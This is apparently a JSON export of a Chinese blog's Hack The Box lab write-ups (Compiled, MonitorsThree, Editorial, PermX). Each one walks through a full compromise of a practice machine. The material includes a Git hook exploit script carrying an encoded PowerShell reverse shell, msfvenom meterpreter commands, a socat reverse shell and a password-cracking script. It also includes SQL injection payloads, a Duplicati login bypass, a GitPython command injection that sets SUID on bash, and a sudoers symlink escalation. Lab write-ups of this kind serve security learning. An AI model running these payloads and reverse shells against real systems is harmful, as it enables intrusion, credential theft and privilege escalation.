[{"title":"HTB-Compiled_Write-up","path":"/2024/09/27/HTB-Compiled_Write-up/","content":"HTB-Compiled_Write-up | •́ ▾ •̀ | HTB-Compiled_Write-up1.前期准备 连接VPN！ 靶场详情： 测试连通性： 连接稳定，开始打靶！ 2.信息收集起手还是Nmap扫描，靶机介绍是Windows系统的，扫描的速度有些久： 扫出来一个3000端口和5000端口，尝试了一下可以直接访问，不需要加hosts文件也行；3000是个Gitea，5000是个可以提交代码仓库的网站： Gitea的Explore里有一些信息，计算器的那个项目有提到使用的Git版本，还暴露了域名信息： 这个Gitea的功能貌似就是像个Github一样的代码托管仓库，5000端口的那个站似乎可以将项目提交上去编译，考虑到环境，大概就是在靶机本地编译了；找到了Git的版本，也去搜了一下，有一个CVE-2024-32002的远程代码执行漏洞： 嗯…看不懂，于是开始Write-up学习法，去翻了其他师傅的Write-up，漏洞倒是找对了，就是这个漏洞原理一时半会搞不明白，后面发现复现起来也挺吃力的…这漏洞很新，POC也是四个月前才出的，打着打着就发现POC都用不明白… 相关文章可参考：https://amalmurali.me/posts/git-rce/ POC：https://github.com/amalmurali47/git_rce 分析的文章看不大明白，此处就只体现复现过程了，等以后实力提升了再回头来复习复习吧… 3.CVE-2024-32002复现根据文章，先在Gitea注册一个账号，然后创建两个空的仓库，这里密码简单点也无所谓满足长度即可： 新建仓库： 创建好的仓库如下图： 随后将上文提到的POC克隆到Kali里，进去文件夹把sh脚本提取出来到一个你喜欢的目录，我这就选&#x2F;tmp了，然后开始改脚本： 1git clone https://github.com/amalmurali47/git_rce.git 这个脚本改了一个下午，参考了多位师傅的Write-up，属于是东拼西凑了，不过还好，成功运行，改的过程虽然难受，不过对我来说还是加深了一些对这个漏洞的理解，至少大概知道这个脚本是怎么运作的了。不过脚本的内容我这就暂时不做注释了，毕竟还没完全理解，以免产生歧义，各位可以对照着POC中的原脚本进行对比理解。 生成反弹Shell的网址：https://www.ddosi.org/shell/ PS：注意是选PowerShell #3 (Base64) 脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/bin/bashgit config --global protocol.file.allow alwaysgit config --global core.symlinks truegit config --global init.defaultBranch main # 选第一个仓库hook_repo_path=&quot;http://gitea.compiled.htb:3000/AyMeow/repo1.git&quot;git clone &quot;$hook_repo_path&quot;cd repo1mkdir -p y/hookscat &gt; y/hooks/post-checkout &lt;&lt;EOF# 这里是反弹Shell的代码#!/bin/bashpowershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgAzACIALAA0ADQAMwAwADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAEOFchmod +x y/hooks/post-checkoutgit add y/hooks/post-checkoutgit commit -m &quot;post-checkout&quot;git pushcd ..# 这里选第二个仓库captain_repo_path=&quot;http://gitea.compiled.htb:3000/AyMeow/repo2.git&quot;git clone &quot;$captain_repo_path&quot;cd repo2git submodule add --name x/y &quot;$hook_repo_path&quot; A/modules/xgit commit -m &quot;add-submodule&quot;printf &quot;.git&quot; &gt; dotgit.txtgit hash-object -w --stdin &lt; dotgit.txt &gt; dot-git.hashprintf &quot;120000 %s 0\\ta &quot; &quot;$(cat dot-git.hash)&quot; &gt; index.infogit update-index --index-info &lt; index.infogit commit -m &quot;add-symlink&quot;git pushcd .. 修改好脚本之后，运行脚本即可，随后将脚本中的第二个仓库的链接放入端口5000的那个站进行编译，同时再起一个终端监听你反弹Shell的端口，等编译完成后，Shell就会被弹回来，在前面的步骤没错的情况下，这个反弹Shell的过程预计要等待个1到5分钟不等，需要一点耐心： 回头看一眼仓库： 然后我们把repo2的连接丢到5000端口的站去编译，同时我们开启监听： 我的5000站的页面不知道为啥显示不全，样式都没加载完，进得也很慢，不过不影响执行就是了，点击提交后就是漫长的等待了，其实如果网络状况好的话还是挺快的： Msf上线在翻看其他师傅的Write-up的时候发现有师傅是使用Msf上线的，结合后续的操作，其实使用Msf上线是最一步到位的操作，因为前文所反弹回来的Shell并没有下载的功能，只能再生成一个Msf马传上去上线再下载，所以不如在这一步就一步到位上线Msf；前面操作都一样，依旧创建两个空仓库，我这选3和4，图中我已经完成上传了： 然后我们需要修改一下POC的脚本，除了改仓库的链接外，还需要将我们的反弹Shell更改成Msf生成的Shellcode： 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.23 LPORT=44301 -f psh-cmd 改好后运行即可，编译的那个网站提交repo4的链接即可，步骤跟前面都一样，同时Msf里需要开启监听，稍等一会即可上线： 4.获取User.txt上线之后自然就要开展新一轮的信息收集了，先看看用户： 有一个Emily，我们目前显然是Richard，瞅一眼桌面，好的，没有Flag，那下一步的方向就是这个Emily了： 先给出结论：在C:\\Program Files\\Gitea\\data里面有一个gitea.db，里面有Emily的密码： 哈？你问我怎么知道的，显然是看Write-up啦，咳咳，Windows中一般来说Program Files或者Program Files（x86）都是默认的安装位置，平常想必各位也有发觉，所以一般来说审计的重点就在这两个目录中。将gitea.db下载到Kali，再传到本机用Navicat打开： 可以看到这一串东西，忽略我的邮箱为啥跟我之前注册的不一样，图是之前截的： 197907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16 显示是pbkdf2$50000$50加密： 还给了盐值： 确定了算法、盐值，编写爆破脚本就完事，自己写的话可以求助G老师。我这就直接搬Write-up的了： 12345678910111213141516171819202122232425262728293031323334353637383940414243import hashlibimport binasciidef pbkdf2_hash(password, salt, iterations=50000, dklen=50): hash_value = hashlib.pbkdf2_hmac( &#x27;sha256&#x27;, # hashing algorithm password.encode(&#x27;utf-8&#x27;), # password salt, # salt iterations, # number of iterations dklen=dklen # key length ) return hash_valuedef find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50): target_hash_bytes = binascii.unhexlify(target_hash) with open(dictionary_file, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file: for line in file: password = line.strip() # generating hash hash_value = pbkdf2_hash(password, salt, iterations, dklen) # Check if hash is correct if hash_value == target_hash_bytes: print(f&quot;Found password: &#123;password&#125;&quot;) return password print(&quot;Password not found.&quot;) return None# Parameterssalt = binascii.unhexlify(&#x27;227d873cca89103cd83a976bdac52486&#x27;) # Salt from gitea.dbtarget_hash = &#x27;97907280dc24fe517c43475bd218bfad56c25d4d11037d8b6da440efd4d691adfead40330b2aa6aaf1f33621d0d73228fc16&#x27; # hash from gitea.db# Patch to dictionary# 记得改这里字典的路径dictionary_file = &#x27;/usr/local/Dict/rockyou.txt&#x27;find_matching_password(dictionary_file, target_hash, salt) 爆破出来密码是12345678，十分简单哈- -： 密码有了，接下来就是登录Emily的账号了，这里又学到了一个新东西：Evil-winrm： 1evil-winrm -i 10.10.11.26 -u emily -p 12345678 成功登录，Flag在C:\\Users\\Emily\\Desktop下： 5.获取Root.txt（CVE-2024-20656复现）接上文，普通用户Flag已获取，下一步就是提权了，这个靶机有个好处，打Root部分的时候不需要再重复前面的动作，我们已经获取到Emily的密码了，如果后续环境崩了还是啥的，直接Evil-winrm登录即可。 登录到Emily时，查看当前目录就发现了VS2019，那应该就是它的漏洞喽： 虽然很不想承认，但是搜漏洞真的不能用中文&#x3D; &#x3D;： 参考文章：https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/ 锁定漏洞CVE-2024-20656，Github上有POC，这个POC需要下载到本地用VS2019来编译才行，其中有几个坑点值得注意一下，先clone到本地；要运用这个POC我们需要准备三个exe，分别是该POC编译生成的Expl.exe、Msf生成的木马Shell.exe、以及确保Expl能在靶机中正常运行的RunasCs.exe；我们先一个一个来： 1git clone https://github.com/Wh04m1001/CVE-2024-20656.git 根据参考文章和Write-up，需要改两处地方，首先先加载项目，注意是选这个选项： 选这个文件： 打开项目后长这样： 需要改main.cpp中的第4行和第187行： 123456# 第4行WCHAR cmd[] = L&quot;C:\\\\Program Files (x86)\\\\Microsoft Visual Studio\\\\2019\\\\Community\\\\Team Tools\\\\DiagnosticsHub\\\\Collector\\\\VSDiagnostics.exe&quot;;# 第187行CopyFile(L&quot;C:\\\\tmp\\\\Shell.exe&quot;, L&quot;C:\\\\ProgramData\\\\Microsoft\\\\VisualStudio\\\\SetupWMI\\\\MofCompiler.exe&quot;, FALSE); 需要注意，第4行的那个路径是靶机中VSDiagnostics.exe的路径，不是本机的，这是一个坑点；第187行前段的路径是你反弹Shell木马的路径；改好后长这样： 然后是编译，我们需要用Release选项来编译，并且确保工具集是2019的版本： 这些步骤都没错的话，选择开始执行： 执行完会弹出个框，长这样，不要慌，文件是正常生成的，去对应的目录找就行： Expl.exe就制作完了，再把Shell.exe生成一下： 1msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.10.16.23 lport=65205 -f exe &gt; /tmp/Shell.exe 还要去Github下载一下RunasCs.exe： 三个程序都准备好后，利用Python的临时Http服务上传到靶机: 同时启用Msf的监听： 这里要注意，每次启用监听模块我们一定要指定对应payload，否则监听不到： set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp 接下来利用RunasCs来启动Expl即可反弹Shell： 1./RunasCs.exe emily 12345678 C:\\tmp\\Expl.exe Root.txt就在C:\\Users\\Administrator\\Desktop里： 至此，所有Flag已获取，打靶结束！ 6.总结 整个靶场打下来用了三天，涉及的两个漏洞复现起来都挺吃力的，Git的那个尝试理解着改脚本改了一下午；VS的那个漏洞第四行没有理解明白，卡了我一天，最后还是请教了羽泪云小栈师傅才整明白的T T；两个漏洞的原理都没太理解明白，不过跟着教程复现出来也是很有收获的，方方面面都加深了一些理解。靶场的质量还是很不错的！后面有其他理解了我再补充吧！ 参考文章： https://www.hyhforever.top/htb-compiled/ https://natro92.fun/posts/be13f570/#SYSTEM https://mp.weixin.qq.com/s/KKi1Ie6UoyAMCFTTB5QBmA https://mp.weixin.qq.com/s/gwAvnAYxixKnZwUT7n9pxw https://mp.weixin.qq.com/s/Kp1MBI2NLuWPlvJWnLZIxA https://mp.weixin.qq.com/s/rrnd3QKSC_vdW0DYVkvSDA https://mp.weixin.qq.com/s/hx3TUw3Zh0GWX3uH1jtTaQ https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/ https://amalmurali.me/posts/git-rce/","tags":["靶场复现"],"categories":["靶场复现"]},{"title":"HTB-MonitorsThree_Write-up","path":"/2024/09/24/HTB-MonitorsThree_Write-up/","content":"HTB-MonitorsThree_Write-up ─&#x3D;≡Σ((( つ•̀ω•́)つ HTB-MonitorsThree_Write-up1.前期准备 连接VPN！ 靶场详情： 测试连通性： 连接正常！打靶！！ 2.信息收集老样子Nmap起手，发现了个域名monitorsthree.htb，加到&#x2F;etc&#x2F;hosts文件先： 1nmap -sSVC 10.10.11.30 访问了一下，右上角有个登陆功能： 一个平平无奇的登录框，弱密码试了一下没进去，有个忘记密码的功能点，猜测突破口应该在这： 与此同时，子域名扫描也启动一下，发现了个cacti.monitorsthree.htb也先加进&#x2F;etc&#x2F;hosts文件： 1wfuzz -c -w /usr/share/wfuzz/wordlist/subdomains/subdomains-top1million-5000.txt -u &quot;http://monitorsthree.htb&quot; -H &quot;Host: FUZZ.monitorsthree.htb&quot; --hc 404 --hl 337 访问发现是一个Cacti，暴露了版本号： 梳理一下目前信息：两个可登录的页面，一个忘记密码的功能点。 突破口应该就在这几个页面中了，这里先给出结论：忘记密码的页面存在Sql注入漏洞； 针对这种登录框也学到了几种测试的思路：用户名密码爆破、Sql注入、弱密码&#x2F;默认密码猜测、前端审计看看存不存在绕过等等；不过在不知道确定的用户名情况下用爆破不太现实，这可作为备选方案，Sql注入是最容易验证的一种测试，所以先测这玩意比较高效。不过在这个靶场环境中，忘记密码的页面中可以将用户名admin枚举出来： 确定了下一步的攻击方向，注就完事！ 3.报错注入&amp;获取低权账号Sql注入的测试很简单，先看看有没有这个洞，再测试一下闭合情况，确认闭合情况后注就完事，这种有报错信息的回显是经典的Sql注入漏洞，单引号闭合情况： 这里有个可以帮助我们快速判断闭合情况的文章：SQL注入原理及如何判断闭合符 确定了是报错注入，网上搜了一下手注的方法，这里我用的是updatexml函数，这里也可以用Sqlmap来注，但是实在是太慢了，且用的是时间盲注，跑了几小时都还没出来，不建议使用这个方法攻击。 这里给出攻击语句： 12345678910111213141&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) #-- 爆库名1&#x27; and updatexml(1,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 5,1),0x7e),1) #-- 爆表名1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e),1) #-- 爆字段1&#x27; and updatexml(1,concat(0x7e,(select left(password,16) from monitorsthree_db.users where username=&#x27;admin&#x27;),0x7e),1) #-- 爆用户admin密码的左半段1&#x27; and updatexml(1,concat(0x7e,(select right(password,16) from monitorsthree_db.users where username=&#x27;admin&#x27;),0x7e),1) #-- 爆用户admin密码的右半段 注完之后，我们会得到一串字符串：31a181c8372e3afc59dab863430610e8，这个就是admin的密码，不过经过了MD5加密，所以下一步自然就是去网上破解啦： 这里附上解密网站：https://hashes.com/zh/decrypt/hash 得到一串密码：greencacti2001，回到那两个登录页面尝试登录，都能进去： 大致查看一下，主域名的后台啥功能都没有，就只是用了展示的，重点还是在cacti的这个控制台里；结合前面的版本信息，去搜索了一下cacti相关的漏洞，根据我们目前的信息，存在CVE-2024-25641任意上传漏洞，Github上有POC，Kali的Msf中也可直接利用；那么既然Kali中有的话，我就直接使用Kali操作了，操作前需要更新Msf，否则不一定搜得到这个漏洞： 1234567┌──(root㉿kali)-[/tmp]└─# apt-get install metasploit-framework┌──(root㉿kali)-[/tmp]└─# msfconsolemsf6 &gt; search cacti 选择该模块选好参数即可： 123456789msf6 &gt; use 3msf6 exploit(multi/http/cacti_package_import_rce) &gt; set password greencacti2001msf6 exploit(multi/http/cacti_package_import_rce) &gt; set rhosts http://cacti.monitorsthree.htbmsf6 exploit(multi/http/cacti_package_import_rce) &gt; set lhost tun0msf6 exploit(multi/http/cacti_package_import_rce) &gt; set lport 65525 Run就完事！www权限直接到手： 4.提权至Marcus接上文，进到网站根目录搜索一番，有一个sql文件，拽过来本地录入一下看看都有啥： 在Kali启动一个Mysql服务，用Navicat连接上去运行cacti.sql文件，在这个user_auth表里找到了admin的password： 但是这个密码没什么用，看起来是原本的默认密码，因为之前尝试过了： 最后在&#x2F;var&#x2F;www&#x2F;html&#x2F;cacti&#x2F;include里面找到了一个config.php，存了数据库的凭证： 获得数据库凭证：cactiuser/cactiuser： 但是说实话，做到这一步的时候，我一直在思考有什么明确的思路可以找到这个目录里面的这个文件，还是说只能挨个去审计，可能我对Cacti的目录结构不了解吧，或许了解了Cacti的目录结构之后会得到更高的效率。 拿到了数据库的凭证了，但是还不知道我们到底要提权到哪，这里做一个信息收集： 1cat /etc/passwd | grep /bin/bash 可以发现有一个marcus用户，那么下一步的方向就是提权到这个用户，结合到刚刚拿到的数据库凭证，猜测数据库里会有关于marcus的凭证，Msf的控制台不好操作，先反弹一个shell回来： 1socat tcp-connect:10.10.16.33:44300 exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane 随后以cactiuser的身份登录数据库： 1mysql -u cactiuser -pcactiuser 进入cacti库，查表： 跟我们之前下载下来的sql文件建立的表结构一样，也有一个user_auth表： 查它！ 1SELECT * FROM user_auth; 很好，marcus出现了！后面的这一串看起来是Hash，将这串东西复制到一个文件里，用john爆破一下： 1234vim m.hashjohn --wordlist=/usr/local/Dict/rockyou.txt m.hashjohn --show m.hash# 首次爆破出来不需要--show，爆破过的就需要--show来展示了。 emmm好，十分简单的密码，ssh登录一波，发现被禁止： 那就去反弹Shell那su上去吧，普通用户的Flag到手： 5.登录绕过&amp;提权至Root拿到了普通用户权限之后，就是想办法提权到Root权限了，不过就前面收集的信息来看，已经都用上了，接下来应该还有新的信息需要收集，不过在这没什么头绪了，翻了翻师傅们的Write-up，原来是查网络连接： 发现有个8200端口，但是只能本地访问，那我们需要把流量代理出来，这里又学到了一个新工具chisel，也是类似frp的东西，简单易用，Kali里直接apt安装即可，靶机上的chisel可以现在Github上下载下来，然后利用Python的临时Http服务传进靶机，这一步骤就不再赘述，下面介绍使用方法： 12# 在靶机上开启服务即可./chisel server 12# 在Kali上启动客户端chisel client 10.10.11.30:8080 8200 回到图形化界面里在火狐打开本地的8200端口即可访问： 去搜了一下有关Duplicati的漏洞，发现存在Duplicati登录绕过漏洞，根据步骤，我们要先找到跟Duplicati有关的数据库信息： 1find / -name Duplicati* 2&gt;/dev/null 通过Msf下载下来，用Navicat读取一下，在Option表里找到server-passphrase和server-passphrase-salt字段： 将server-passphrase用Base64解码后转换成16进制： 159be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a 至于为什么这么做，可以回到Duplicati的页面，右键查看源代码，进行JS审计： 看不懂可以找GPT解析，同时再抓包配合理解，点击Sign in之后不做任何修改放掉第一个包复制响应包中的Nonce字段： 这是第二个包： 可以看到那个Salt字段就是我们之前在数据库中找到的server-passphrase-salt字段对应的值，我们把Nonce字段替换掉前面代码的data.Nonce字段，saltedpwd是server-passphrase值base64解密后转化成16进制的值： 123var saltedpwd = &quot;59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a&quot; ;var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64 . parse(&quot;KtX9WxwVz+rDOBvZBp6/UnrePuhbB0N3d0OaC1zliTA=&quot;)+ saltedpwd)).toString(CryptoJS .enc.Base64);console.log(noncedpwd); 然后打开F12的控制台运行上述代码获取noncedpwd的值： 然后将这个新生成的值置换掉前面第二个包的password字段： 然后就水灵灵的进来了： 去简单了解了一下这平台是干啥的，就是一个用来备份的网站，思路就是创建root.txt的备份计划，然后再恢复出来读取即可，创建备份计划即可，名字随意，密码自动生成也可以： 备份位置要选**&#x2F;Source&#x2F;tmp**，选&#x2F;tmp是不生效的： root.txt的位置也一样，是在**&#x2F;Source&#x2F;root&#x2F;**里面，其实自己翻一翻就知道了，&#x2F;root里面并没有这个文件： 第四第五步均默认即可，保存之后即可在首页找到我们的备份任务： 点击运行后，去Restore里恢复： 选择恢复到&#x2F;source&#x2F;tmp中，勾选允许读写： 显示恢复成功： 回到终端，访问&#x2F;tmp即可找到root.txt： 至此，所有Flag已获取，打靶结束！ 6.总结 这个靶场满打满算打靶复现加编写复现报告用了一天半，难度是中级，确实在其中学到了很多，靶场整体的逻辑连贯性也很强，不会有那种很突兀的操作，一切均师出有名，好评靶场！ 知识点：Sql注入-报错注入、数据库基础、Msf框架利用、哈希爆破、MD5爆破、内网穿透、登陆绕过、JS代审。","tags":["靶场复现","Cacti","JS代审","Duplicati"],"categories":["靶场复现","HTB"]},{"title":"HTB-Editorial_Write-up","path":"/2024/09/20/HTB-Editorial_Write-up/","content":"HTB-Editorial_Write-up (๑¯∀¯๑) HTB-Editorial_Write-up1.前期准备 连接VPN！ 靶场详情： 测试连通性： 连接正常，开始打靶！ 2.信息收集老样子，起手一个Nmap扫描： 1nmap -sSVC 10.10.11.20 熟悉的两个端口，找出了个域名editorial.htb，先加到hosts文件；后面还扫了一下子域名，不过没有什么结果，这里就不放截图了，加好了hosts文件之后访问一下80端口： 首页没有什么东西，但是那个Publish with us有功能点，可以上传文件： Write-up里说这里存在SSRF，由于我对这玩意不太熟悉，我就直接看着Write-up操作了，顺便复习了一波SSRF的概念；在Kali开一个临时的Http服务，测试一下这里是否存在SSRF： 设置好对应的IP： 测试了一下，点击提交的话，Kali那边没反应，但是点击Preview的话，Kali那能监听到访问： 去复习了一下SSRF的出现场景，符合情况： 那么！启动BP！抓个包看看什么情况： 弹回来了一个链接，回到浏览拼接一下发现直接下载了： 改成了127.0.0.1试了试，返回了一个图片： 图片没什么用，但是用127.0.0.1访问莫名其妙很慢： Write-up下一步是爆破端口，至于为什么爆端口咱也不知道，算是学到了一种新思路了，但是我发现用BP爆端口实在是慢得令人发指，到处搜了一下，发现也有人用ffuf来爆，这玩意快啊，全端口四分钟就爆完了，还能筛选报文长度和读取文件来FUZZ： 123456ffuf -request /tmp/1.txt -w numbers_1_to_65535.txt -v -request-proto http -fs 61#-request 理解成指定文件FUZZ，1.txt是我保存的报文。#-w\t使用什么字典。#-v 显示详细信息。#-request-proto 指定协议访问。#-fs 过滤什么长度的响应包。 十分迅速！四分钟不到就爆完了，可以看到，5000端口有不一样的东西： 爆破使用的报文长这样，注意选对地方FUZZ，FUZZ指需要模糊测试的地方： 回到BP，使用5000端口访问一下： 拼接上去下载下来了一个文件，里面泄露了一些接口： 挨个访问完发现/api/latest/metadata/messages/authors这个接口泄露了用户dev的凭证： 那东西都出来了，那就直接ssh启动！ 1ssh@10.10.11.20 3..git泄露与CVE-2022-24439利用上来老样子看看有什么用户先： 1cat /etc/passwd | grep /bin/bash 发现有三个用户，还有个prod，看了看sudo -l，没有什么信息： 家目录下有个apps的目录，进去是空的，不过用了ls -al查就会发现了.git文件夹： 嗯，又加深了对ls命令的理解，那既然是.git泄露，那就看看提交日志，看到了prod相关： 1git log 顺便请教了老G这是什么意思： 既然是“降级”，那这得看看这是提交了啥： 1git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae oi！prod的凭证出来了，直接登录，这回sudo -l下面有东西了： 可以使用sudo执行/opt/internal_apps/clone_changes/clone_prod_change.py这个脚本，那接下来是代码审计时间： 123456789101112#!/usr/bin/python3import osimport sysfrom git import Repoos.chdir(&#x27;/opt/internal_apps/clone_changes&#x27;)url_to_clone = sys.argv[1]r = Repo.init(&#x27;&#x27;, bare=True)r.clone_from(url_to_clone, &#x27;new_changes&#x27;, multi_options=[&quot;-c protocol.ext.allow=always&quot;]) 看起来是提交相关的内容，依旧请教老G： 直觉告诉我multi_options=[&quot;-c protocol.ext.allow=always&quot;]这个功能有大问题，因为可以使用外部协议；看了眼Write-up，确实是利用这个，GitPython有一个远程代码执行漏洞，但是怎么通过上述代码查出这个漏洞是这里解题的关键，接下来就是查一下GitPython的版本了： 1pip3 list | grep -i git 嗯，符合利用条件，那么用就完事！ 1sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py &quot;ext::sh -c chmod% u+s% /bin/bash&quot; 让老G解释一下： 又学到一种思路~执行之后，/bin/bash -p即可切换到root权限，拿Flag即可： 至此，所有Flag已获取，打靶结束！ 4.总结 这个靶场还是让我收获了很多，SSRF的复习巩固、端口爆破的新姿势、ls命令的加深理解、SUID位的加深理解、.git泄露的加深理解、一些思路的衔接，总体难度不难，主要是帮助自己稳固知识体系，好评靶场！","tags":["靶场复现",".git泄露"],"categories":["靶场复现","HTB"]},{"title":"HTB-Permx_Write-up","path":"/2024/09/19/HTB-Permx_Write-up/","content":"HTB-Permx_Write-up ⸂⸂⸜(രᴗര )⸝⸃⸃ HTB-Permx_Write-up1.前期准备 连接好你的VPN~ 靶场详情： 测试连通性： 连接良好！打靶开始！ 2.信息收集起手就是一个Nmap扫描+子域名爆破的组合拳： 1nmap -sSVC 10.10.11.23 发现一个域名permx.htb，先加进hosts文件，不访问先，先把子域名爆破干了： 1wfuzz -c -w /usr/share/wfuzz/wordlist/subdomains/subdomains-top1million-5000.txt -u &quot;http://permx.htb&quot; -H &quot;Host: FUZZ.permx.htb&quot; --hc 404 --hl 9 发现两个子域名，一同加进hosts文件： 然后一一访问，permx.htb主域名没有什么信息，lms.permx.htb是一个登录页面，采用了Chamilo LMS搭建： 虽然但是，还是试了试弱密码，没进去；下一步不知道干啥了，做了个目录扫描，也发现了一些信息： 1dirsearch -u http://lms.permx.htb -x 403 感觉泄露了挺多信息的，访问了一下&#x2F;app目录，发现存在目录遍历漏洞： 感觉有东西，但是我没翻出来啥有用的，不过知道了这玩意用的是PHP语言，还是上网搜搜有什么CVE可以用吧，搜出来了一个CVE-2023-3368，但是用不成功，找了老半天，没发现能用的，去翻了翻Write-up，发现用的是CVE-2023-4220，很好用嗷，甚至演示图都是本靶场： 3.POC利用及Setfacl提权把脚本clone下来，设置好监听即可： 123git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poccd chamilo-lms-unauthenticated-big-upload-rce-pocpip install -r requirements.txt 1python3 main.py -u http://lms.perms.htb -a revshell 前两个是名字，随意即可，后面的是Kali的地址和端口，设置好监听即可上线： Shell到手了，信息收集一波，查一下有什么用户： 那下一步就是想办法拿到mtz的权限了，翻一下网站的配置文件看看有没有什么收获： 一开始翻到web里面去了，扫了眼Write-up，发现要在app目录里面找，还是经验不足啊-。-；最终在/var/www/chamilo/app/config/configuration.php文件中找到了一串密码，根据之前打的经验，一般会存在密码复用的漏洞，所以直接在Kali里使用这个密码ssh登录mtz： 1cat /var/www/chamilo/app/config/configuration.php | grep password 1ssh mtz@10.10.11.23 User的Flag就在家目录下： User的Flag拿到了，那接下来就是提权了，先看看sudo -l有什么： 发现可以以root权限操作这个acl.sh，待会审计一下这个脚本；上次打靶场用到了linpeas.sh，这里也传上来用一用，复习复习，可以看到也能筛选出上述信息： 接下来审计一下/opt/acl.sh这个文件： 123456789101112131415161718192021222324252627282930313233343536#!/bin/bashif [ &quot;$#&quot; -ne 3 ]; then /usr/bin/echo &quot;Usage: $0 user perm file&quot; exit 1fi#脚本期望接收三个参数：用户 (user)、权限 (perm) 和目标文件 (file)。#如果参数数量不等于 3，脚本输出正确的用法信息并退出user=&quot;$1&quot;perm=&quot;$2&quot;target=&quot;$3&quot;#将传入的参数分别赋值给 user（用户）、perm（权限）和 target（目标文件路径）。if [[ &quot;$target&quot; != /home/mtz/* || &quot;$target&quot; == *..* ]]; then /usr/bin/echo &quot;Access denied.&quot; exit 1fi#检查 target 路径是否位于 /home/mtz/ 目录下且不包含 &quot;..&quot;，以防止用户访问受限制的目录或进行路径跳转。#如果不满足条件，脚本输出“Access denied.”并退出# Check if the path is a fileif [ ! -f &quot;$target&quot; ]; then /usr/bin/echo &quot;Target must be a file.&quot; exit 1fi#检查 target 是否为一个文件。#如果 target 不是文件（不存在或是目录），脚本输出“Target must be a file.”并退出。/usr/bin/sudo /usr/bin/setfacl -m u:&quot;$user&quot;:&quot;$perm&quot; &quot;$target&quot;#使用 setfacl 命令为 target 文件上的指定用户 (user) 分配 ACL 权限 (perm)。#这个命令使用了 sudo 提升权限，确保有足够权限来修改 ACL。 脚本的作用就是使用 sudo 提权执行 setfacl 命令，修改目标文件的 ACL，为指定用户设置相应的权限。这样的话，可以创建一个控制权限文件的软链接，如/etc/sudoers通过上述脚本更改该软链接的权限，从而添加对应信息提权： 1ln -s /etc/sudoers AyMeow 赋予权限： 1sudo /opt/acl.sh mtz rwx /home/mtz/Aymeow 进去把mtz加上： 然后使用sudo su就可以切换到root了： Flag就在root目录下： 至此，所有Flag已获取，打靶完毕。 4.总结 这个靶场总体的难度不大，涉及到轻微的Shell脚本审计，不过脚本也很简单，实在不行用GPT解析一下也是可以的；我认为这靶场的难度主要在信息收集上，就比如CVE-2023-4220我自己死活都搜不出来，以及对Linux基础不太熟悉的朋友，可能想不到软链接提权的这个用法。 漏洞的搜索能力还要针对性加强一下，以便以后更好的找到重点漏洞。","tags":["靶场复现","Chamilo LMS"],"categories":["靶场复现","HTB"]},{"title":"HTB-BoardLight_Write-up","path":"/2024/09/18/HTB-BoardLight_Write-up/","content":"HTB-BoardLight_Write-up (✿╹◡╹) 